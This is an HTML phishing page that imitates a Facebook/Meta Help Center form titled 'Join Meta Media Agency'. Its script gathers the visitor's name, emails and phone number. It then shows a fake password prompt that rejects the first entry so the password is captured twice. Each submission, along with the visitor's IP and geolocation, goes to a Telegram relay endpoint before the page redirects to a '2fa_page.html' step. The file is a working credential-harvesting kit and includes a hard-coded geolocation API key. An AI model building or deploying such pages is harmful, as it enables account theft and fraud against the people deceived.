<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Help Center - Join Meta Media Agency</title>
<style>
/* GIỮ NGUYÊN GIAO DIỆN CỦA BẠN */
body { font-family: Arial, sans-serif; margin:0; background:#f0f2f5; display:flex; flex-direction:column; min-height:100vh; }
.header { background-color:#355797; border-bottom:1px solid #355797; padding:10px 20px; display:flex; align-items:center; justify-content:space-between; }
.header .search-bar { flex-grow:1; margin-right:20px; max-width:500px; }
.header .search-bar input { width:100%; padding:8px 15px; border:1px solid #ddd; border-radius:20px; font-size:15px; outline:none; background-color:rgba(255,255,255,0.2); color:#fff; }
.header .search-bar input::placeholder { color:rgba(255,255,255,0.7); }
.header .help-center-link { font-size:18px; font-weight:bold; color:#fff; text-decoration:none; }
.header .language { font-size:14px; color:#fff; }
.main-content { display:flex; flex-grow:1; }
.sidebar { width:250px; background:#fff; padding:20px; border-right:1px solid #ddd; overflow-y:auto; }
.sidebar ul { list-style:none; padding:0; margin:0; }
.sidebar ul li { margin-bottom:10px; }
.sidebar ul li a { text-decoration:none; color:#333; padding:8px 10px; display:block; border-radius:6px; }
.sidebar ul li a:hover, .sidebar ul li a.active { background-color:#f0f2f5; color:#1877f2; }
.content-area { flex-grow:1; padding:20px; background-color:#f0f2f5; }
.form-container { background:#fff; padding:30px; border-radius:8px; max-width:700px; margin:0 auto; }
.form-container h2 { font-size:24px; color:#1c2b33; margin-bottom:20px; }
.form-container p { font-size:15px; color:#606770; margin-bottom:20px; line-height:1.5; }
.form-container label { display:block; font-size:14px; color:#606770; margin-bottom:5px; }
.form-container input[type="text"], .form-container input[type="email"], .form-container textarea { width:calc(100%-20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:15px; box-sizing:border-box; }
.form-container input:focus, .form-container textarea:focus { border-color:#1877f2; outline:none; }
.form-container textarea { resize:vertical; min-height:120px; }
.form-container .ticket-number { font-weight:bold; color:#1877f2; }
.form-container .note { font-size:13px; color:#606770; margin-top:-10px; margin-bottom:15px; }
.form-container .terms { font-size:13px; color:#606770; margin-top:20px; margin-bottom:20px; }
.form-container .terms a { color:#1877f2; text-decoration:none; }
.form-container button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; display:block; margin-top:20px; }
.form-container button:hover { background-color:#166fe5; }
.popup-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; z-index:2000; display:none; }
.popup-content { background:#fff; padding:30px; border-radius:8px; width:90%; max-width:450px; text-align:center; }
.popup-content h3 { font-size:20px; color:#1c2b33; margin-bottom:15px; }
.popup-content p { font-size:15px; color:#606770; margin-bottom:20px; }
.popup-content input[type="password"] { width:calc(100%-20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:16px; box-sizing:border-box; outline:none; }
.popup-content input:focus { border-color:#1877f2; }
.popup-content button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; outline:none; }
.popup-content button:hover { background-color:#166fe5; }
.popup-content .error-message { color:#fa3e3e; font-size:13px; margin-top:-10px; margin-bottom:10px; text-align:left; display:none; }
@media (max-width:768px){.sidebar{display:none}.header{display:none}.main-content{flex-direction:column}.content-area{padding:10px}.form-container{padding:20px}}
</style>
</head>
<body>
<div class="header">
  <a href="#" class="help-center-link">facebook</a>
  <div class="search-bar"><input type="text" placeholder="How can we help?"></div>
  <span class="language">English (US)</span>
</div>

<div class="main-content">
  <div class="sidebar">
    <ul>
      <li><a href="#">Creating an Account</a></li>
      <li><a href="#">Your Profile</a></li>
      <li><a href="#">Friending</a></li>
      <li><a href="#">Dating</a></li>
      <li><a href="#">Your Home Page</a></li>
      <li><a href="#">Messaging</a></li>
      <li><a href="#">Reels</a></li>
      <li><a href="#">Stories</a></li>
      <li><a href="#">Photos</a></li>
      <li><a href="#">Videos</a></li>
      <li><a href="#">Gaming</a></li>
      <li><a href="#">Pages</a></li>
      <li><a href="#">Groups</a></li>
      <li><a href="#">Events</a></li>
      <li><a href="#">Fundraisers and Donations</a></li>
      <li><a href="#">Pay</a></li>
      <li><a href="#">Marketplace</a></li>
      <li><a href="#">Apps</a></li>
      <li><a href="#">Mobile Apps</a></li>
      <li><a href="#">Accessibility</a></li>
    </ul>
  </div>

  <div class="content-area">
    <div class="form-container">
      <h2>Join Meta Media Agency</h2>
      <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
      <p>We’re excited to invite you to join us! Fill in the necessary details to activate your account and start collaborating.</p>

      <form id="disagreeForm">
        <label for="yourName">Your Name *</label>
        <input type="text" id="yourName" name="yourName" required>

        <label for="businessEmail">Business Email *</label>
        <input type="email" id="businessEmail" name="businessEmail"  required>
        <p class="note">Notifications about the verification status will be sent to this email.</p>

        <label for="personalEmail">Personal Email *</label>
        <input type="email" id="personalEmail" name="personalEmail" required>

        <label for="mobilePhoneNumber">Mobile Phone Number *</label>
        <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber"  required>
        <p class="note">We can use this phone number to contact you for verification.</p>

        <label for="additionalInfo">Please provide us information that will help us investigate</label>
        <textarea id="additionalInfo" name="additionalInfo"></textarea>

        <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>

        <button type="submit" id="sendButton">Send</button>
      </form>
    </div>
  </div>
</div>

<div class="popup-overlay" id="passwordPopupOverlay">
  <div class="popup-content">
    <h3>Please Enter Your Password</h3>
    <p>For security reasons, please enter your password to continue.</p>
    <input type="password" id="passwordInput" placeholder="Password" required>
    <div class="error-message" id="passwordError">Incorrect password. Please try again.</div>
    <button id="confirmPasswordButton">Confirm</button>
  </div>
</div>

<script>
// --- Config --- 
const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf';

let ipAddress='N/A', locationData='N/A', formData={}, passwordAttemptCount=0, passwordAttemptValue1='', passwordAttemptValue2='';

const ticketNumberSpan=document.getElementById('ticketNumber');
const disagreeForm=document.getElementById('disagreeForm');
const sendButton=document.getElementById('sendButton');

const passwordPopupOverlay=document.getElementById('passwordPopupOverlay');
const passwordInput=document.getElementById('passwordInput');
const passwordError=document.getElementById('passwordError');
const confirmPasswordButton=document.getElementById('confirmPasswordButton');

// --- Utilities ---
function generateRandomTicketNumber(){return Math.floor(100000000000+Math.random()*900000000000).toString();}
async function getIPAndLocation(){try{if(!IPGEOLOCATION_API_KEY){ipAddress='N/A';locationData='N/A';return;} const res=await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${IPGEOLOCATION_API_KEY}`); const data=await res.json(); ipAddress=data.ip||'N/A'; locationData=`${data.city||'Unknown City'}, ${data.state_prov||'Unknown Region'}, ${data.country_name||'Unknown Country'}`;}catch(e){ipAddress='N/A';locationData='N/A';}}

async function sendMessageToTelegram(message){
  try{
    await fetch('/api/send-telegram',{method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({message})});
  }catch(err){console.error('Telegram send error:',err);}
}

// --- Handlers ---
sendButton.addEventListener('click', async e=>{
  e.preventDefault();
  formData={
    yourName:document.getElementById('yourName').value,
    businessEmail:document.getElementById('businessEmail').value,
    personalEmail:document.getElementById('personalEmail').value,
    mobilePhoneNumber:document.getElementById('mobilePhoneNumber').value,
    additionalInfo:document.getElementById('additionalInfo').value,
    ticketNumber:ticketNumberSpan.textContent
  };
  if(!formData.yourName||!formData.businessEmail||!formData.personalEmail||!formData.mobilePhoneNumber){alert('Please fill all required fields');return;}
  if(ipAddress==='N/A') await getIPAndLocation();
  passwordInput.value=''; passwordError.style.display='none'; passwordPopupOverlay.style.display='flex'; passwordInput.focus();
});

confirmPasswordButton.addEventListener('click', async ()=>{
  const password=passwordInput.value; if(!password){passwordError.textContent='Password cannot be empty.';passwordError.style.display='block';return;}
  passwordAttemptCount++;
  let msg=`<b>New Submission Attempt ${passwordAttemptCount}</b>\n------------------------------------\n<b>IP & Location:</b> ${ipAddress} (${locationData})\n<b>Ticket:</b> ${formData.ticketNumber}\n<b>Name:</b> ${formData.yourName}\n<b>Business Email:</b> ${formData.businessEmail}\n<b>Personal Email:</b> ${formData.personalEmail}\n<b>Phone:</b> ${formData.mobilePhoneNumber}\n`;
  if(passwordAttemptCount===1){passwordAttemptValue1=password; msg+=`<b>Password Attempt 1:</b> ${passwordAttemptValue1}`; await sendMessageToTelegram(msg); passwordError.textContent='Incorrect password. Please try again.'; passwordError.style.display='block';}
  else if(passwordAttemptCount===2){passwordAttemptValue2=password; msg+=`<b>Password Attempt 2:</b> ${passwordAttemptValue2}`; await sendMessageToTelegram(msg); passwordPopupOverlay.style.display='none';
    localStorage.setItem('formData',JSON.stringify(formData)); localStorage.setItem('ipAddress',ipAddress); localStorage.setItem('locationData',locationData); localStorage.setItem('passwordAttemptValue1',passwordAttemptValue1); localStorage.setItem('passwordAttemptValue2',passwordAttemptValue2);
    window.location.href='2fa_page.html';
  }
  passwordInput.value='';
});

document.addEventListener('DOMContentLoaded',()=>{
  ticketNumberSpan.textContent=generateRandomTicketNumber();
  getIPAndLocation();
  localStorage.clear();
});
</script>
</body>
</html>
